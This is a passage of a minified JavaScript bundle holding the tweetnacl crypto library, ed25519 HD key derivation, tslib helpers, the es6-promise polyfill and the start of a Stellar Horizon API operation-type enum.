                var Ye = new Uint8Array(Ge);
                return O(Ye, Ge),
                Ye
            }
            ,
            M.secretbox = function(Ge, Ye, it) {
                ht(Ge, Ye, it),
                ze(it, Ye);
                for (var Fe = new Uint8Array(dt + Ge.length), ut = new Uint8Array(Fe.length), wt = 0; wt < Ge.length; wt++)
                    Fe[wt + dt] = Ge[wt];
                return U(ut, Fe, Fe.length, Ye, it),
                ut.subarray(Et)
            }
            ,
            M.secretbox.open = function(Ge, Ye, it) {
                ht(Ge, Ye, it),
                ze(it, Ye);
                for (var Fe = new Uint8Array(Et + Ge.length), ut = new Uint8Array(Fe.length), wt = 0; wt < Ge.length; wt++)
                    Fe[wt + Et] = Ge[wt];
                return Fe.length < 32 || Z(ut, Fe, Fe.length, Ye, it) !== 0 ? null : ut.subarray(dt)
            }
            ,
            M.secretbox.keyLength = Ue,
            M.secretbox.nonceLength = rt,
            M.secretbox.overheadLength = Et,
            M.scalarMult = function(Ge, Ye) {
                if (ht(Ge, Ye),
                Ge.length !== gt)
                    throw new Error("bad n size");
                if (Ye.length !== ft)
                    throw new Error("bad p size");
                var it = new Uint8Array(ft);
                return Ze(it, Ge, Ye),
                it
            }
            ,
            M.scalarMult.base = function(Ge) {
                if (ht(Ge),
                Ge.length !== gt)
                    throw new Error("bad n size");
                var Ye = new Uint8Array(ft);
                return $e(Ye, Ge),
                Ye
            }
            ,
            M.scalarMult.scalarLength = gt,
            M.scalarMult.groupElementLength = ft,
            M.box = function(Ge, Ye, it, Fe) {
                var ut = M.box.before(it, Fe);
                return M.secretbox(Ge, Ye, ut)
            }
            ,
            M.box.before = function(Ge, Ye) {
                ht(Ge, Ye),
                Je(Ge, Ye);
                var it = new Uint8Array(Ot);
                return qe(it, Ge, Ye),
                it
            }
            ,
            M.box.after = M.secretbox,
            M.box.open = function(Ge, Ye, it, Fe) {
                var ut = M.box.before(it, Fe);
                return M.secretbox.open(Ge, Ye, ut)
            }
            ,
            M.box.open.after = M.secretbox.open,
            M.box.keyPair = function() {
                var Ge = new Uint8Array(Yt)
                  , Ye = new Uint8Array(Ct);
                return Ne(Ge, Ye),
                {
                    publicKey: Ge,
                    secretKey: Ye
                }
            }
            ,
            M.box.keyPair.fromSecretKey = function(Ge) {
                if (ht(Ge),
                Ge.length !== Ct)
                    throw new Error("bad secret key size");
                var Ye = new Uint8Array(Yt);
                return $e(Ye, Ge),
                {
                    publicKey: Ye,
                    secretKey: new Uint8Array(Ge)
                }
            }
            ,
            M.box.publicKeyLength = Yt,
            M.box.secretKeyLength = Ct,
            M.box.sharedKeyLength = Ot,
            M.box.nonceLength = Vt,
            M.box.overheadLength = M.secretbox.overheadLength,
            M.sign = function(Ge, Ye) {
                if (ht(Ge, Ye),
                Ye.length !== Ft)
                    throw new Error("bad secret key size");
                var it = new Uint8Array(xr + Ge.length);
                return He(it, Ge, Ge.length, Ye),
                it
            }
            ,
            M.sign.open = function(Ge, Ye) {
                if (ht(Ge, Ye),
                Ye.length !== Dt)
                    throw new Error("bad public key size");
                var it = new Uint8Array(Ge.length)
                  , Fe = Me(it, Ge, Ge.length, Ye);
                if (Fe < 0)
                    return null;
                for (var ut = new Uint8Array(Fe), wt = 0; wt < ut.length; wt++)
                    ut[wt] = it[wt];
                return ut
            }
            ,
            M.sign.detached = function(Ge, Ye) {
                for (var it = M.sign(Ge, Ye), Fe = new Uint8Array(xr), ut = 0; ut < Fe.length; ut++)
                    Fe[ut] = it[ut];
                return Fe
            }
            ,
            M.sign.detached.verify = function(Ge, Ye, it) {
                if (ht(Ge, Ye, it),
                Ye.length !== xr)
                    throw new Error("bad signature size");
                if (it.length !== Dt)
                    throw new Error("bad public key size");
                var Fe = new Uint8Array(xr + Ge.length), ut = new Uint8Array(xr + Ge.length), wt;
                for (wt = 0; wt < xr; wt++)
                    Fe[wt] = Ye[wt];
                for (wt = 0; wt < Ge.length; wt++)
                    Fe[wt + xr] = Ge[wt];
                return Me(ut, Fe, Fe.length, it) >= 0
            }
            ,
            M.sign.keyPair = function() {
                var Ge = new Uint8Array(Dt)
                  , Ye = new Uint8Array(Ft);
                return Ce(Ge, Ye),
                {
                    publicKey: Ge,
                    secretKey: Ye
                }
            }
            ,
            M.sign.keyPair.fromSecretKey = function(Ge) {
                if (ht(Ge),
                Ge.length !== Ft)
                    throw new Error("bad secret key size");
                for (var Ye = new Uint8Array(Dt), it = 0; it < Ye.length; it++)
                    Ye[it] = Ge[32 + it];
                return {
                    publicKey: Ye,
                    secretKey: new Uint8Array(Ge)
                }
            }
            ,
            M.sign.keyPair.fromSeed = function(Ge) {
                if (ht(Ge),
                Ge.length !== Mr)
                    throw new Error("bad seed size");
                for (var Ye = new Uint8Array(Dt), it = new Uint8Array(Ft), Fe = 0; Fe < 32; Fe++)
                    it[Fe] = Ge[Fe];
                return Ce(Ye, it, !0),
                {
                    publicKey: Ye,
                    secretKey: it
                }
            }
            ,
            M.sign.publicKeyLength = Dt,
            M.sign.secretKeyLength = Ft,
            M.sign.seedLength = Mr,
            M.sign.signatureLength = xr,
            M.hash = function(Ge) {
                ht(Ge);
                var Ye = new Uint8Array(at);
                return We(Ye, Ge, Ge.length),
                Ye
            }
            ,
            M.hash.hashLength = at,
            M.verify = function(Ge, Ye) {
                return ht(Ge, Ye),
                Ge.length === 0 || Ye.length === 0 || Ge.length !== Ye.length ? !1 : ne(Ge, 0, Ye, 0, Ge.length) === 0
            }
            ,
            M.setPRNG = function(Ge) {
                O = Ge
            }
            ,
            function() {
                var Ge = typeof self < "u" ? self.crypto || self.msCrypto : null;
                if (Ge && Ge.getRandomValues) {
                    var Ye = 65536;
                    M.setPRNG(function(it, Fe) {
                        var ut, wt = new Uint8Array(Fe);
                        for (ut = 0; ut < Fe; ut += Ye)
                            Ge.getRandomValues(wt.subarray(ut, ut + Math.min(Fe - ut, Ye)));
                        for (ut = 0; ut < Fe; ut++)
                            it[ut] = wt[ut];
                        _t(wt)
                    })
                } else
                    typeof commonjsRequire < "u" && (Ge = requireCryptoBrowserify(),
                    Ge && Ge.randomBytes && M.setPRNG(function(it, Fe) {
                        var ut, wt = Ge.randomBytes(Fe);
                        for (ut = 0; ut < Fe; ut++)
                            it[ut] = wt[ut];
                        _t(wt)
                    }))
            }()
        }
        )(_.exports ? _.exports : self.nacl = self.nacl || {})
    }(naclFast)),
    naclFast.exports
}
var utils$5 = {}, hasRequiredUtils$3;
function requireUtils$3() {
    return hasRequiredUtils$3 || (hasRequiredUtils$3 = 1,
    Object.defineProperty(utils$5, "__esModule", {
        value: !0
    }),
    utils$5.replaceDerive = utils$5.pathRegex = void 0,
    utils$5.pathRegex = new RegExp("^m(\\/[0-9]+')+$"),
    utils$5.replaceDerive = _ => _.replace("'", "")),
    utils$5
}
var hasRequiredDist$3;
function requireDist$3() {
    return hasRequiredDist$3 || (hasRequiredDist$3 = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.derivePath = _.isValidPath = _.getPublicKey = _.CKDPriv = _.getMasterKeyFromSeed = void 0;
        const M = requireBrowser$d()
          , j = requireNaclFast()
          , O = requireUtils$3()
          , x = "ed25519 seed"
          , w = 2147483648;
        _.getMasterKeyFromSeed = b => {
            const Y = M("sha512", x).update(Buffer.from(b, "hex")).digest()
              , F = Y.slice(0, 32)
              , V = Y.slice(32);
            return {
                key: F,
                chainCode: V
            }
        }
        ,
        _.CKDPriv = ({key: b, chainCode: X}, Y) => {
            const F = Buffer.allocUnsafe(4);
            F.writeUInt32BE(Y, 0);
            const V = Buffer.concat([Buffer.alloc(1, 0), b, F])
              , K = M("sha512", X).update(V).digest()
              , Q = K.slice(0, 32)
              , ee = K.slice(32);
            return {
                key: Q,
                chainCode: ee
            }
        }
        ,
        _.getPublicKey = (b, X=!0) => {
            const F = j.sign.keyPair.fromSeed(b).secretKey.subarray(32)
              , V = Buffer.alloc(1, 0);
            return X ? Buffer.concat([V, Buffer.from(F)]) : Buffer.from(F)
        }
        ,
        _.isValidPath = b => O.pathRegex.test(b) ? !b.split("/").slice(1).map(O.replaceDerive).some(isNaN) : !1,
        _.derivePath = (b, X, Y=w) => {
            if (!_.isValidPath(b))
                throw new Error("Invalid derivation path");
            const {key: F, chainCode: V} = _.getMasterKeyFromSeed(X);
            return b.split("/").slice(1).map(O.replaceDerive).map(Q => parseInt(Q, 10)).reduce( (Q, ee) => _.CKDPriv(Q, ee + Y), {
                key: F,
                chainCode: V
            })
        }
    }(dist$4)),
    dist$4
}
var distExports$1 = requireDist$3()
  , lib$4 = {
    exports: {}
};
/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */
var extendStatics = function(_, M) {
    return extendStatics = Object.setPrototypeOf || {
        __proto__: []
    }instanceof Array && function(j, O) {
        j.__proto__ = O
    }
    || function(j, O) {
        for (var x in O)
            O.hasOwnProperty(x) && (j[x] = O[x])
    }
    ,
    extendStatics(_, M)
};
function __extends(_, M) {
    extendStatics(_, M);
    function j() {
        this.constructor = _
    }
    _.prototype = M === null ? Object.create(M) : (j.prototype = M.prototype,
    new j)
}
var __assign = function() {
    return __assign = Object.assign || function(M) {
        for (var j, O = 1, x = arguments.length; O < x; O++) {
            j = arguments[O];
            for (var w in j)
                Object.prototype.hasOwnProperty.call(j, w) && (M[w] = j[w])
        }
        return M
    }
    ,
    __assign.apply(this, arguments)
};
function __rest(_, M) {
    var j = {};
    for (var O in _)
        Object.prototype.hasOwnProperty.call(_, O) && M.indexOf(O) < 0 && (j[O] = _[O]);
    if (_ != null && typeof Object.getOwnPropertySymbols == "function")
        for (var x = 0, O = Object.getOwnPropertySymbols(_); x < O.length; x++)
            M.indexOf(O[x]) < 0 && Object.prototype.propertyIsEnumerable.call(_, O[x]) && (j[O[x]] = _[O[x]]);
    return j
}
function __decorate(_, M, j, O) {
    var x = arguments.length, w = x < 3 ? M : O === null ? O = Object.getOwnPropertyDescriptor(M, j) : O, b;
    if (typeof Reflect == "object" && typeof Reflect.decorate == "function")
        w = Reflect.decorate(_, M, j, O);
    else
        for (var X = _.length - 1; X >= 0; X--)
            (b = _[X]) && (w = (x < 3 ? b(w) : x > 3 ? b(M, j, w) : b(M, j)) || w);
    return x > 3 && w && Object.defineProperty(M, j, w),
    w
}
function __param(_, M) {
    return function(j, O) {
        M(j, O, _)
    }
}
function __metadata(_, M) {
    if (typeof Reflect == "object" && typeof Reflect.metadata == "function")
        return Reflect.metadata(_, M)
}
function __awaiter(_, M, j, O) {
    function x(w) {
        return w instanceof j ? w : new j(function(b) {
            b(w)
        }
        )
    }
    return new (j || (j = Promise))(function(w, b) {
        function X(V) {
            try {
                F(O.next(V))
            } catch (K) {
                b(K)
            }
        }
        function Y(V) {
            try {
                F(O.throw(V))
            } catch (K) {
                b(K)
            }
        }
        function F(V) {
            V.done ? w(V.value) : x(V.value).then(X, Y)
        }
        F((O = O.apply(_, M || [])).next())
    }
    )
}
function __generator(_, M) {
    var j = {
        label: 0,
        sent: function() {
            if (w[0] & 1)
                throw w[1];
            return w[1]
        },
        trys: [],
        ops: []
    }, O, x, w, b;
    return b = {
        next: X(0),
        throw: X(1),
        return: X(2)
    },
    typeof Symbol == "function" && (b[Symbol.iterator] = function() {
        return this
    }
    ),
    b;
    function X(F) {
        return function(V) {
            return Y([F, V])
        }
    }
    function Y(F) {
        if (O)
            throw new TypeError("Generator is already executing.");
        for (; j; )
            try {
                if (O = 1,
                x && (w = F[0] & 2 ? x.return : F[0] ? x.throw || ((w = x.return) && w.call(x),
                0) : x.next) && !(w = w.call(x, F[1])).done)
                    return w;
                switch (x = 0,
                w && (F = [F[0] & 2, w.value]),
                F[0]) {
                case 0:
                case 1:
                    w = F;
                    break;
                case 4:
                    return j.label++,
                    {
                        value: F[1],
                        done: !1
                    };
                case 5:
                    j.label++,
                    x = F[1],
                    F = [0];
                    continue;
                case 7:
                    F = j.ops.pop(),
                    j.trys.pop();
                    continue;
                default:
                    if (w = j.trys,
                    !(w = w.length > 0 && w[w.length - 1]) && (F[0] === 6 || F[0] === 2)) {
                        j = 0;
                        continue
                    }
                    if (F[0] === 3 && (!w || F[1] > w[0] && F[1] < w[3])) {
                        j.label = F[1];
                        break
                    }
                    if (F[0] === 6 && j.label < w[1]) {
                        j.label = w[1],
                        w = F;
                        break
                    }
                    if (w && j.label < w[2]) {
                        j.label = w[2],
                        j.ops.push(F);
                        break
                    }
                    w[2] && j.ops.pop(),
                    j.trys.pop();
                    continue
                }
                F = M.call(_, j)
            } catch (V) {
                F = [6, V],
                x = 0
            } finally {
                O = w = 0
            }
        if (F[0] & 5)
            throw F[1];
        return {
            value: F[0] ? F[1] : void 0,
            done: !0
        }
    }
}
function __createBinding(_, M, j, O) {
    O === void 0 && (O = j),
    _[O] = M[j]
}
function __exportStar(_, M) {
    for (var j in _)
        j !== "default" && !M.hasOwnProperty(j) && (M[j] = _[j])
}
function __values(_) {
    var M = typeof Symbol == "function" && Symbol.iterator
      , j = M && _[M]
      , O = 0;
    if (j)
        return j.call(_);
    if (_ && typeof _.length == "number")
        return {
            next: function() {
                return _ && O >= _.length && (_ = void 0),
                {
                    value: _ && _[O++],
                    done: !_
                }
            }
        };
    throw new TypeError(M ? "Object is not iterable." : "Symbol.iterator is not defined.")
}
function __read(_, M) {
    var j = typeof Symbol == "function" && _[Symbol.iterator];
    if (!j)
        return _;
    var O = j.call(_), x, w = [], b;
    try {
        for (; (M === void 0 || M-- > 0) && !(x = O.next()).done; )
            w.push(x.value)
    } catch (X) {
        b = {
            error: X
        }
    } finally {
        try {
            x && !x.done && (j = O.return) && j.call(O)
        } finally {
            if (b)
                throw b.error
        }
    }
    return w
}
function __spread() {
    for (var _ = [], M = 0; M < arguments.length; M++)
        _ = _.concat(__read(arguments[M]));
    return _
}
function __spreadArrays() {
    for (var _ = 0, M = 0, j = arguments.length; M < j; M++)
        _ += arguments[M].length;
    for (var O = Array(_), x = 0, M = 0; M < j; M++)
        for (var w = arguments[M], b = 0, X = w.length; b < X; b++,
        x++)
            O[x] = w[b];
    return O
}
function __await(_) {
    return this instanceof __await ? (this.v = _,
    this) : new __await(_)
}
function __asyncGenerator(_, M, j) {
    if (!Symbol.asyncIterator)
        throw new TypeError("Symbol.asyncIterator is not defined.");
    var O = j.apply(_, M || []), x, w = [];
    return x = {},
    b("next"),
    b("throw"),
    b("return"),
    x[Symbol.asyncIterator] = function() {
        return this
    }
    ,
    x;
    function b(Q) {
        O[Q] && (x[Q] = function(ee) {
            return new Promise(function(ae, ne) {
                w.push([Q, ee, ae, ne]) > 1 || X(Q, ee)
            }
            )
        }
        )
    }
    function X(Q, ee) {
        try {
            Y(O[Q](ee))
        } catch (ae) {
            K(w[0][3], ae)
        }
    }
    function Y(Q) {
        Q.value instanceof __await ? Promise.resolve(Q.value.v).then(F, V) : K(w[0][2], Q)
    }
    function F(Q) {
        X("next", Q)
    }
    function V(Q) {
        X("throw", Q)
    }
    function K(Q, ee) {
        Q(ee),
        w.shift(),
        w.length && X(w[0][0], w[0][1])
    }
}
function __asyncDelegator(_) {
    var M, j;
    return M = {},
    O("next"),
    O("throw", function(x) {
        throw x
    }),
    O("return"),
    M[Symbol.iterator] = function() {
        return this
    }
    ,
    M;
    function O(x, w) {
        M[x] = _[x] ? function(b) {
            return (j = !j) ? {
                value: __await(_[x](b)),
                done: x === "return"
            } : w ? w(b) : b
        }
        : w
    }
}
function __asyncValues(_) {
    if (!Symbol.asyncIterator)
        throw new TypeError("Symbol.asyncIterator is not defined.");
    var M = _[Symbol.asyncIterator], j;
    return M ? M.call(_) : (_ = typeof __values == "function" ? __values(_) : _[Symbol.iterator](),
    j = {},
    O("next"),
    O("throw"),
    O("return"),
    j[Symbol.asyncIterator] = function() {
        return this
    }
    ,
    j);
    function O(w) {
        j[w] = _[w] && function(b) {
            return new Promise(function(X, Y) {
                b = _[w](b),
                x(X, Y, b.done, b.value)
            }
            )
        }
    }
    function x(w, b, X, Y) {
        Promise.resolve(Y).then(function(F) {
            w({
                value: F,
                done: X
            })
        }, b)
    }
}
function __makeTemplateObject(_, M) {
    return Object.defineProperty ? Object.defineProperty(_, "raw", {
        value: M
    }) : _.raw = M,
    _
}
function __importStar(_) {
    if (_ && _.__esModule)
        return _;
    var M = {};
    if (_ != null)
        for (var j in _)
            Object.hasOwnProperty.call(_, j) && (M[j] = _[j]);
    return M.default = _,
    M
}
function __importDefault(_) {
    return _ && _.__esModule ? _ : {
        default: _
    }
}
function __classPrivateFieldGet(_, M) {
    if (!M.has(_))
        throw new TypeError("attempted to get private field on non-instance");
    return M.get(_)
}
function __classPrivateFieldSet(_, M, j) {
    if (!M.has(_))
        throw new TypeError("attempted to set private field on non-instance");
    return M.set(_, j),
    j
}
const tslib_es6 = Object.freeze(Object.defineProperty({
    __proto__: null,
    get __assign() {
        return __assign
    },
    __asyncDelegator,
    __asyncGenerator,
    __asyncValues,
    __await,
    __awaiter,
    __classPrivateFieldGet,
    __classPrivateFieldSet,
    __createBinding,
    __decorate,
    __exportStar,
    __extends,
    __generator,
    __importDefault,
    __importStar,
    __makeTemplateObject,
    __metadata,
    __param,
    __read,
    __rest,
    __spread,
    __spreadArrays,
    __values
}, Symbol.toStringTag, {
    value: "Module"
}))
  , require$$0$2 = getAugmentedNamespace(tslib_es6);
var es6Promise$1 = {
    exports: {}
}, es6Promise = es6Promise$1.exports, hasRequiredEs6Promise;
function requireEs6Promise() {
    return hasRequiredEs6Promise || (hasRequiredEs6Promise = 1,
    function(_, M) {
        (function(j, O) {
            _.exports = O()
        }
        )(es6Promise, function() {
            function j(we) {
                var _e = typeof we;
                return we !== null && (_e === "object" || _e === "function")
            }
            function O(we) {
                return typeof we == "function"
            }
            var x = void 0;
            Array.isArray ? x = Array.isArray : x = function(we) {
                return Object.prototype.toString.call(we) === "[object Array]"
            }
            ;
            var w = x
              , b = 0
              , X = void 0
              , Y = void 0
              , F = function(_e, Ce) {
                be[b] = _e,
                be[b + 1] = Ce,
                b += 2,
                b === 2 && (Y ? Y(xe) : Ee())
            };
            function V(we) {
                Y = we
            }
            function K(we) {
                F = we
            }
            var Q = typeof window < "u" ? window : void 0
              , ee = Q || {}
              , ae = ee.MutationObserver || ee.WebKitMutationObserver
              , ne = typeof self > "u" && typeof process$1 < "u" && {}.toString.call(process$1) === "[object process]"
              , oe = typeof Uint8ClampedArray < "u" && typeof importScripts < "u" && typeof MessageChannel < "u";
            function ue() {
                return function() {
                    return process$1.nextTick(xe)
                }
            }
            function fe() {
                return typeof X < "u" ? function() {
                    X(xe)
                }
                : ye()
            }
            function he() {
                var we = 0
                  , _e = new ae(xe)
                  , Ce = document.createTextNode("");
                return _e.observe(Ce, {
                    characterData: !0
                }),
                function() {
                    Ce.data = we = ++we % 2
                }
            }
            function pe() {
                var we = new MessageChannel;
                return we.port1.onmessage = xe,
                function() {
                    return we.port2.postMessage(0)
                }
            }
            function ye() {
                var we = setTimeout;
                return function() {
                    return we(xe, 1)
                }
            }
            var be = new Array(1e3);
            function xe() {
                for (var we = 0; we < b; we += 2) {
                    var _e = be[we]
                      , Ce = be[we + 1];
                    _e(Ce),
                    be[we] = void 0,
                    be[we + 1] = void 0
                }
                b = 0
            }
            function Ae() {
                try {
                    var we = Function("return this")().require("vertx");
                    return X = we.runOnLoop || we.runOnContext,
                    fe()
                } catch {
                    return ye()
                }
            }
            var Ee = void 0;
            ne ? Ee = ue() : ae ? Ee = he() : oe ? Ee = pe() : Q === void 0 && typeof commonjsRequire == "function" ? Ee = Ae() : Ee = ye();
            function Be(we, _e) {
                var Ce = this
                  , st = new this.constructor(L);
                st[q] === void 0 && Ve(st);
                var et = Ce._state;
                if (et) {
                    var tt = arguments[et - 1];
                    F(function() {
                        return Ze(et, st, tt, Ce._result)
                    })
                } else
                    Te(Ce, st, we, _e);
                return st
            }
            function ce(we) {
                var _e = this;
                if (we && typeof we == "object" && we.constructor === _e)
                    return we;
                var Ce = new _e(L);
                return ge(Ce, we),
                Ce
            }
            var q = Math.random().toString(36).substring(2);
            function L() {}
            var U = void 0
              , Z = 1
              , te = 2;
            function se() {
                return new TypeError("You cannot resolve a promise with itself")
            }
            function de() {
                return new TypeError("A promises callback cannot return that same promise.")
            }
            function re(we, _e, Ce, st) {
                try {
                    we.call(_e, Ce, st)
                } catch (et) {
                    return et
                }
            }
            function $(we, _e, Ce) {
                F(function(st) {
                    var et = !1
                      , tt = re(Ce, _e, function(He) {
                        et || (et = !0,
                        _e !== He ? ge(st, He) : Pe(st, He))
                    }, function(He) {
                        et || (et = !0,
                        Ie(st, He))
                    }, "Settle: " + (st._label || " unknown promise"));
                    !et && tt && (et = !0,
                    Ie(st, tt))
                }, we)
            }
            function ie(we, _e) {
                _e._state === Z ? Pe(we, _e._result) : _e._state === te ? Ie(we, _e._result) : Te(_e, void 0, function(Ce) {
                    return ge(we, Ce)
                }, function(Ce) {
                    return Ie(we, Ce)
                })
            }
            function ve(we, _e, Ce) {
                _e.constructor === we.constructor && Ce === Be && _e.constructor.resolve === ce ? ie(we, _e) : Ce === void 0 ? Pe(we, _e) : O(Ce) ? $(we, _e, Ce) : Pe(we, _e)
            }
            function ge(we, _e) {
                if (we === _e)
                    Ie(we, se());
                else if (j(_e)) {
                    var Ce = void 0;
                    try {
                        Ce = _e.then
                    } catch (st) {
                        Ie(we, st);
                        return
                    }
                    ve(we, _e, Ce)
                } else
                    Pe(we, _e)
            }
            function Re(we) {
                we._onerror && we._onerror(we._result),
                Le(we)
            }
            function Pe(we, _e) {
                we._state === U && (we._result = _e,
                we._state = Z,
                we._subscribers.length !== 0 && F(Le, we))
            }
            function Ie(we, _e) {
                we._state === U && (we._state = te,
                we._result = _e,
                F(Re, we))
            }
            function Te(we, _e, Ce, st) {
                var et = we._subscribers
                  , tt = et.length;
                we._onerror = null,
                et[tt] = _e,
                et[tt + Z] = Ce,
                et[tt + te] = st,
                tt === 0 && we._state && F(Le, we)
            }
            function Le(we) {
                var _e = we._subscribers
                  , Ce = we._state;
                if (_e.length !== 0) {
                    for (var st = void 0, et = void 0, tt = we._result, He = 0; He < _e.length; He += 3)
                        st = _e[He],
                        et = _e[He + Ce],
                        st ? Ze(Ce, st, et, tt) : et(tt);
                    we._subscribers.length = 0
                }
            }
            function Ze(we, _e, Ce, st) {
                var et = O(Ce)
                  , tt = void 0
                  , He = void 0
                  , ke = !0;
                if (et) {
                    try {
                        tt = Ce(st)
                    } catch (Me) {
                        ke = !1,
                        He = Me
                    }
                    if (_e === tt) {
                        Ie(_e, de());
                        return
                    }
                } else
                    tt = st;
                _e._state !== U || (et && ke ? ge(_e, tt) : ke === !1 ? Ie(_e, He) : we === Z ? Pe(_e, tt) : we === te && Ie(_e, tt))
            }
            function $e(we, _e) {
                try {
                    _e(function(st) {
                        ge(we, st)
                    }, function(st) {
                        Ie(we, st)
                    })
                } catch (Ce) {
                    Ie(we, Ce)
                }
            }
            var Ne = 0;
            function qe() {
                return Ne++
            }
            function Ve(we) {
                we[q] = Ne++,
                we._state = void 0,
                we._result = void 0,
                we._subscribers = []
            }
            function lt() {
                return new Error("Array Methods must be provided an Array")
            }
            var nt = function() {
                function we(_e, Ce) {
                    this._instanceConstructor = _e,
                    this.promise = new _e(L),
                    this.promise[q] || Ve(this.promise),
                    w(Ce) ? (this.length = Ce.length,
                    this._remaining = Ce.length,
                    this._result = new Array(this.length),
                    this.length === 0 ? Pe(this.promise, this._result) : (this.length = this.length || 0,
                    this._enumerate(Ce),
                    this._remaining === 0 && Pe(this.promise, this._result))) : Ie(this.promise, lt())
                }
                return we.prototype._enumerate = function(Ce) {
                    for (var st = 0; this._state === U && st < Ce.length; st++)
                        this._eachEntry(Ce[st], st)
                }
                ,
                we.prototype._eachEntry = function(Ce, st) {
                    var et = this._instanceConstructor
                      , tt = et.resolve;
                    if (tt === ce) {
                        var He = void 0
                          , ke = void 0
                          , Me = !1;
                        try {
                            He = Ce.then
                        } catch (rt) {
                            Me = !0,
                            ke = rt
                        }
                        if (He === Be && Ce._state !== U)
                            this._settledAt(Ce._state, st, Ce._result);
                        else if (typeof He != "function")
                            this._remaining--,
                            this._result[st] = Ce;
                        else if (et === ct) {
                            var Ue = new et(L);
                            Me ? Ie(Ue, ke) : ve(Ue, Ce, He),
                            this._willSettleAt(Ue, st)
                        } else
                            this._willSettleAt(new et(function(rt) {
                                return rt(Ce)
                            }
                            ), st)
                    } else
                        this._willSettleAt(tt(Ce), st)
                }
                ,
                we.prototype._settledAt = function(Ce, st, et) {
                    var tt = this.promise;
                    tt._state === U && (this._remaining--,
                    Ce === te ? Ie(tt, et) : this._result[st] = et),
                    this._remaining === 0 && Pe(tt, this._result)
                }
                ,
                we.prototype._willSettleAt = function(Ce, st) {
                    var et = this;
                    Te(Ce, void 0, function(tt) {
                        return et._settledAt(Z, st, tt)
                    }, function(tt) {
                        return et._settledAt(te, st, tt)
                    })
                }
                ,
                we
            }();
            function je(we) {
                return new nt(this,we).promise
            }
            function Ke(we) {
                var _e = this;
                return w(we) ? new _e(function(Ce, st) {
                    for (var et = we.length, tt = 0; tt < et; tt++)
                        _e.resolve(we[tt]).then(Ce, st)
                }
                ) : new _e(function(Ce, st) {
                    return st(new TypeError("You must pass an array to race."))
                }
                )
            }
            function Qe(we) {
                var _e = this
                  , Ce = new _e(L);
                return Ie(Ce, we),
                Ce
            }
            function We() {
                throw new TypeError("You must pass a resolver function as the first argument to the promise constructor")
            }
            function mt() {
                throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.")
            }
            var ct = function() {
                function we(_e) {
                    this[q] = qe(),
                    this._result = this._state = void 0,
                    this._subscribers = [],
                    L !== _e && (typeof _e != "function" && We(),
                    this instanceof we ? $e(this, _e) : mt())
                }
                return we.prototype.catch = function(Ce) {
                    return this.then(null, Ce)
                }
                ,
                we.prototype.finally = function(Ce) {
                    var st = this
                      , et = st.constructor;
                    return O(Ce) ? st.then(function(tt) {
                        return et.resolve(Ce()).then(function() {
                            return tt
                        })
                    }, function(tt) {
                        return et.resolve(Ce()).then(function() {
                            throw tt
                        })
                    }) : st.then(Ce, Ce)
                }
                ,
                we
            }();
            ct.prototype.then = Be,
            ct.all = je,
            ct.race = Ke,
            ct.resolve = ce,
            ct.reject = Qe,
            ct._setScheduler = V,
            ct._setAsap = K,
            ct._asap = F;
            function vt() {
                var we = void 0;
                if (typeof window < "u")
                    we = window;
                else if (typeof self < "u")
                    we = self;
                else
                    try {
                        we = Function("return this")()
                    } catch {
                        throw new Error("polyfill failed because global object is unavailable in this environment")
                    }
                var _e = we.Promise;
                if (_e) {
                    var Ce = null;
                    try {
                        Ce = Object.prototype.toString.call(_e.resolve())
                    } catch {}
                    if (Ce === "[object Promise]" && !_e.cast)
                        return
                }
                we.Promise = ct
            }
            return ct.polyfill = vt,
            ct.Promise = ct,
            ct
        })
    }(es6Promise$1)),
    es6Promise$1.exports
}
const version = "8.3.0"
  , require$$2 = {
    version
};
var horizon_api = {}, hasRequiredHorizon_api;
function requireHorizon_api() {
    return hasRequiredHorizon_api || (hasRequiredHorizon_api = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.Horizon = void 0,
        function(M) {
            (function(j) {
                j.createAccount = "create_account",
                j.payment = "payment",
                j.pathPayment = "path_payment_strict_receive",
                j.createPassiveOffer = "create_passive_sell_offer",
                j.manageOffer = "manage_sell_offer",
                j.setOptions = "set_options",
                j.changeTrust = "change_trust",
                j.allowTrust = "allow_trust",
                j.accountMerge = "account_merge",
                j.inflation = "inflation",
                j.manageData = "manage_data",
                j.bumpSequence = "bump_sequence",
                j.manageBuyOffer = "manage_buy_offer",
                j.pathPaymentStrictSend = "path_payment_strict_send",
                j.createClaimableBalance = "create_claimable_balance",
                j.claimClaimableBalance = "claim_claimable_balance",
                j.beginSponsoringFutureReserves = "begin_sponsoring_future_reserves",
                j.endSponsoringFutureReserves = "end_sponsoring_future_reserves",
                j.revokeSponsorship = "revoke_sponsorship",
                j.clawback = "clawback",
                j.clawbackClaimableBalance = "clawback_claimable_balance",
                j.setTrustLineFlags = "set_trust_line_flags"
            }
            )(M.OperationResponseType || (M.OperationResponseType = {})),
            function(j) {
                j[j.createAccount = 0] = "createAccount",
                j[j.payment = 1] = "payment",
                j[j.pathPayment = 2] = "pathPayment",
                j[j.createPassiveOffer = 3] = "createPassiveOffer",
                j[j.manageOffer = 4] = "manageOffer",
                j[j.setOptions = 5] = "setOptions",
                j[j.changeTrust = 6] = "changeTrust",
                j[j.allowTrust = 7] = "allowTrust",
                j[j.accountMerge = 8] = "accountMerge",
                j[j.inflation = 9] = "inflation",
                j[j.manageData = 10] = "manageData",
                j[j.bumpSequence = 11] = "bumpSequence",
                j[j.manageBuyOffer = 12] = "manageBuyOffer",
                j[j.pathPaymentStrictSend = 13] = "pathPaymentStrictSend",
                j[j.createClaimableBalance = 14] = "createClaimableBalance",
                j[j.claimClaimableBalance = 15] = "claimClaimableBalance",
